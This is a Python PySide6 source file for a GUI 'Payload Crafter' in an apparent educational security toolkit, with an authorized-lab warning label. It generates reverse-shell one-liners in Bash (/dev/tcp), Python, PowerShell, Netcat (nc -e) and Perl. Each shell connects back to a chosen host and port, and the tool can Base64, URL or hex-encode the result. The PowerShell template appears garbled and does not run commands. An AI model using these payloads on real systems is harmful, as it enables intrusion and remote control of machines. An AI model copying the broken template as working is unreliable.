"""Payload Crafter - The Depths (educational)"""

import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from PySide6.QtWidgets import (
    QComboBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMainWindow,
    QPushButton,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

from apps.depths.tools._ui import BTN_STYLE, GREEN, INPUT_STYLE, OUT_STYLE, YELLOW, hline, make_header
from core.theme import COLORS, FONTS

LANGUAGES = ["Bash", "Python", "PowerShell", "Netcat", "Perl"]

TEMPLATES = {
    "Bash":        "/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1",
    "Python":      "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "PowerShell":  "$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();while($true){{[byte[]]$r=0..65535|%{{0}};$s.Read($r,0,$r.Length)|Out-Null;$s.Write($r,0,$s.Length)}}",
    "Netcat":      "nc -e /bin/sh {host} {port}",
    "Perl":        "perl -MIO::Socket::INET -e '$p=fork;exit,if($p);$c=IO::Socket::INET->new(PeerAddr=>\"{host}:{port}\");$stdin,$stdout,$stderr=\\*STDIN,\\*STDOUT,\\*STDERR;select($stdout);$|=1;print $c \"\\n\";while(<$c>){print $stdout $_;print $c $stdout}' {host} {port}",
}

ENCODINGS = ["Raw", "Base64", "URL-encode", "Hex"]


def url_encode(data: str):
    import urllib.parse
    return urllib.parse.quote(data, safe="")


def hex_encode(data: str):
    return "".join(f"%{ord(c):02x}" for c in data)


class PayloadCrafterWindow(QMainWindow):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Payload Crafter - The Depths (Educational)")
        self.resize(720, 560)
        self.setStyleSheet(f"QMainWindow {{ background: {COLORS['bg_light']}; }}")

        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(10)

        layout.addWidget(make_header(
            "\U0001F4C2 Payload Crafter",
            "Generate connection payloads for lab exercises"
        ))
        layout.addWidget(hline())

        warn = QLabel("\u26A0 For authorized labs / CTF use only. Do not use on systems you don't own.")
        warn.setWordWrap(True)
        warn.setStyleSheet(f"color: {COLORS['warning']}; font-size: {FONTS['size_sm']}px;")
        layout.addWidget(warn)

        row = QHBoxLayout()
        lbl = QLabel("Language:")
        lbl.setStyleSheet(f"color: {COLORS['text']}; font-size: {FONTS['size_md']}px;")
        row.addWidget(lbl)
        self.lang = QComboBox()
        self.lang.addItems(LANGUAGES)
        self.lang.setStyleSheet(INPUT_STYLE + "QComboBox { padding: 4px 8px; }")
        row.addWidget(self.lang, 1)
        layout.addLayout(row)

        row2 = QHBoxLayout()
        lbl2 = QLabel("Host/IP:")
        lbl2.setStyleSheet(f"color: {COLORS['text']}; font-size: {FONTS['size_md']}px;")
        row2.addWidget(lbl2)
        self.host = QLineEdit("127.0.0.1")
        self.host.setStyleSheet(INPUT_STYLE)
        row2.addWidget(self.host, 1)

        lbl3 = QLabel("Port:")
        lbl3.setStyleSheet(f"color: {COLORS['text']}; font-size: {FONTS['size_md']}px;")
        row2.addWidget(lbl3)
        self.port = QLineEdit("4444")
        self.port.setStyleSheet(INPUT_STYLE)
        self.port.setFixedWidth(80)
        row2.addWidget(self.port)
        layout.addLayout(row2)

        row3 = QHBoxLayout()
        lbl4 = QLabel("Encode:")
        lbl4.setStyleSheet(f"color: {COLORS['text']}; font-size: {FONTS['size_md']}px;")
        row3.addWidget(lbl4)
        self.enc = QComboBox()
        self.enc.addItems(ENCODINGS)
        self.enc.setStyleSheet(INPUT_STYLE + "QComboBox { padding: 4px 8px; }")
        row3.addWidget(self.enc, 1)
        layout.addLayout(row3)

        self.craft_btn = QPushButton("\U0001F6E0 Craft Payload")
        self.craft_btn.setStyleSheet(BTN_STYLE)
        self.craft_btn.clicked.connect(self._craft)
        layout.addWidget(self.craft_btn)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet(OUT_STYLE)
        layout.addWidget(self.output, 1)

        self._log("[*] Payload Crafter ready")

    def _log(self, msg):
        self.output.append(msg)

    def _craft(self):
        lang = self.lang.currentText()
        host = self.host.text().strip() or "127.0.0.1"
        port = self.port.text().strip() or "4444"
        enc = self.enc.currentText()

        template = TEMPLATES.get(lang, "")
        payload = template.format(host=host, port=port)

        self.output.clear()
        self.output.setTextColor(YELLOW)
        self._log(f"[*] Language: {lang}")
        self._log(f"[*] Target: {host}:{port}")
        self._log(f"[*] Encoding: {enc}\n")

        if enc == "Raw":
            final = payload
        elif enc == "Base64":
            final = base64.b64encode(payload.encode()).decode()
        elif enc == "URL-encode":
            final = url_encode(payload)
        else:
            final = hex_encode(payload)

        self.output.setTextColor(GREEN)
        self._log("[*] Generated payload:")
        self._log("")
        self._log(final)
        self._log("")
        self.output.setTextColor(YELLOW)
        self._log("[*] Security note: always validate payloads in a controlled sandbox.")

    def closeEvent(self, event):
        super().closeEvent(event)


def run(parent=None):
    win = PayloadCrafterWindow(parent)
    win.show()
    return win
